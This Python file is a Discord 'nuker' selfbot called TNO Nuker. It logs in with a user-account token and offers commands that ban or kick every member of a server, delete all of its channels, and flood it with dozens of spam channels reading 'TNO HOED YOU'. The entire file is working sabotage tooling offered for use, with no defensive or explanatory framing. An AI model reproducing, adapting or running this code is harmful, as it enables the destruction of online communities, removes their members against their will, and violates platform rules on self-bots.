import discord
import time
from discord.ext import commands
from colorama import Fore, init 
import requests
import os 
import random

prefix = "rich"

TNO = commands.Bot(command_prefix=prefix, self_bot=True)
TNO.remove_command('help')

@TNO.event
async def on_connect():
    print(f'''{Fore.RED}
 _____               
|_   _|              
  | |   _ __    ___  
  | |  | '_ \  / _ \ 
  | |  | | | || (_) |
  \_/  |_| |_| \___/
                     
                            
           {Fore.WHITE}TNO NUKER HAS STARTED                            
            {Fore.WHITE}[+] Made by Sirus
              {Fore.WHITE}_________________    
                {Fore.WHITE}
                {Fore.WHITE}[-] Wizz
                  {Fore.WHITE}[-] Ban
                    {Fore.WHITE}[-] Kick
                     {Fore.WHITE}[-] Channels
                       {Fore.WHITE}[-] Dash
                                                                                               
                                                                               ''')

@TNO.command()
async def help(ctx):
  
    embed = discord.Embed(title=" 𝘛𝘕𝘖 𝘕𝘜𝘒𝘌𝘙💚💫", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/745459720302886922/748257091541663854/Avatar-42-1.gif")
    embed.add_field(name=prefix+"**wizz**", value="`𝘕𝘶𝘬𝘦𝘴 𝘵𝘩𝘦 𝘴𝘦𝘳𝘷𝘦𝘳`.\n", inline=False)
    embed.add_field(name=prefix+"**ban**", value="`𝘉𝘢𝘯𝘴 𝘈𝘭𝘭`\n", inline=False)
    embed.add_field(name=prefix+"**kick**", value="`𝘒𝘪𝘤𝘬𝘴 𝘈𝘭𝘭`\n", inline=False)  
    embed.add_field(name=prefix+"**channels**", value="`𝘊𝘳𝘦𝘢𝘵𝘦 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴`\n", inline=False)
    embed.add_field(name=prefix+"**dash**", value="`𝘋𝘦𝘭𝘦𝘵𝘦𝘴 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴`\n", inline=False)
    embed.add_field(name=prefix+'⠀', value="**Made by Sirus**", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://cdn.discordapp.com/attachments/710124130330214493/748320923463188550/image0.gif")
    await ctx.send(embed=embed)
@TNO.command()
async def wizz(ctx):
    await ctx.message.delete()
    print(f"{Fore.RED}Starting Tno Nuker...")
    for users in ctx.guild.members:
        try:
            await users.ban()
            print(f"{Fore.WHITE}Banned")
        except:
            print(f"{Fore.RED}Failed To Ban")
            print(f"{Fore.WHITE}TNO HOED YOU💚💫")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.RED}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'TNO HOED YOU💚💫')
            print(f"{Fore.WHITE}Added {channel.name}")
  
@TNO.command()
async def ban(ctx):
    await ctx.message.delete()
    await ctx.send("`Ban Starting...`")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://cdn.discordapp.com/attachments/745459720302886922/748256364463259768/image0-155.gif')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been banned from {ctx.guild.name}")


@TNO.command()
async def kick(ctx):
    await ctx.message.delete()
    await ctx.send("`TNO HOED YOU💚💫...`")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://cdn.discordapp.com/attachments/745459720302886922/748256364463259768/image0-155.gif')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been kicked from {ctx.guild.name}")


@TNO.command()
async def channels(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED} Deleting Channels...")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.WHITE}Creating Channels...")
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'TNO HOED YOU💚💫')
    print(f"{Fore.RED}Added {channel.name}")

@TNO.command()
async def dash(ctx):
  await ctx.message.delete()
  print(f"{Fore.WHITE}Deleting Channels")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.RED} Deleted Channels")

TNO.run('token', bot=False)